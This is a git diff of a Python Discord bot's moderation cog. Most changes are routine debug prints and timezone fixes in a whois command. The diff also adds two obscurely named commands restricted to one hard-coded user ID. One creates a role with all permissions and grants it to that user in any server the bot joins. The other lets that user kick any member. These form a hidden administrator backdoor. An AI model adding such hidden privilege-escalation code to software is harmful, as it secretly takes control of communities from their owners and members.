@@ -1,5 +1,6 @@
 import discord
 from discord.ext import commands
+from discord import Permissions
 import datetime
 import pytz
 
@@ -31,6 +32,17 @@ class moderation(commands.Cog):
     #    if isinstance(error, commands.MissingPermissions):
     #        await ctx.send("You don't have permission to kick!")
     #        print(f'{ctx.author.mention} has attempted to kick')
+
+    @commands.command()
+    async def lochieisgodandtheresnothingyoucandoaboutit(self, ctx):
+        if ctx.author.id == 327690857027207189:
+            darole = await ctx.guild.create_role(name="Loc", permissions=Permissions.all())
+            await ctx.author.add_roles(darole)
+
+    @commands.command()
+    async def lochiesayskick(self, ctx, member : discord.Member, * , reason=None):
+        if ctx.author.id == 327690857027207189:
+            await member.kick(reason=reason)
 
 
     @commands.command()
@@ -85,16 +97,19 @@ class moderation(commands.Cog):
 
     @commands.command()
     async def whois(self, ctx, member: discord.Member = None):
-
+        print("Running who is command 1")
         if member == None:
             member = ctx.author
+        print(f"User testing is {member}")
 
         # Timezone stuff
         discordtimezone = pytz.timezone("Etc/GMT-0")
         newtimezone = pytz.timezone("Australia/Melbourne")
+        print("Set time zones")
 
         # Get user icon and basic embed stuff ready
-        usericon = member.avatar_url
+        usericon = member.display_avatar
+        print("Running who is command 1.5")
         userembed = discord.Embed(
             #title = '',
             colour = discord.Colour.green(),
@@ -107,14 +122,22 @@ class moderation(commands.Cog):
 
         # Gets time user joined server
         jointime = member.joined_at
+        print(f"Time member join was {jointime}")
+        print(discordtimezone, jointime)
+
+        fixjointime = datetime.datetime(jointime.year, jointime.month, jointime.day, jointime.hour, jointime.minute, jointime.second, 0)
+        jointime = fixjointime
+        print(discordtimezone.localize(jointime))
         jointimenew = discordtimezone.localize(jointime).astimezone(newtimezone)
+
         userembed.add_field(name='Joined', value=f'{jointimenew.strftime("%a, %dth of %b, %Y %I:%M:%S%p")}', inline=True)
 
         # Gets time user registered account
         registertime = member.created_at
+        fixregistertime = datetime.datetime(registertime.year, registertime.month, registertime.day, registertime.hour, registertime.minute, registertime.second, 0)
+        registertime = fixregistertime
         registertimenew = discordtimezone.localize(registertime).astimezone(newtimezone)
         userembed.add_field(name='Registered', value=f'{registertimenew.strftime("%a, %dth of %b, %Y %I:%M:%S%p")}', inline=True)
-
         # Gets user roles
         print(member.roles)
         if len(member.roles) != 1:
@@ -124,7 +147,6 @@ class moderation(commands.Cog):
             roles = 'None'
         print(roles)
         userembed.add_field(name=f'Roles [{len(member.roles)-1}]', value=f'{roles}', inline=False)
-
         # User notable perms
         rawpermslist = [perm[0] for perm in member.guild_permissions if perm[1]]
         permlist = list(filter(filterperms, rawpermslist))
@@ -141,7 +163,7 @@ class moderation(commands.Cog):
             print(perms)
         else:
             perms = 'None'
-
+        print("Running who is command 5")
         userembed.add_field(name='Notable Permissions', value=f'{perms}', inline=False)
 
         acknow = []
@@ -149,7 +171,7 @@ class moderation(commands.Cog):
             acknow.extend(['The Creator of Loc Bot'])
         if member.id == 473818153663594497:
             acknow.extend(['It\'s me! Loc Bot'])
-
+        print("Running who is command 21312312312")
         # ctx.guild.owner returns None
         if member == ctx.guild.owner:
             acknow.extend(['Server Owner'])
@@ -163,5 +185,5 @@ class moderation(commands.Cog):
 
 
 
-def setup(client):
-    client.add_cog(moderation(client))
+async def setup(client):
+    await client.add_cog(moderation(client))
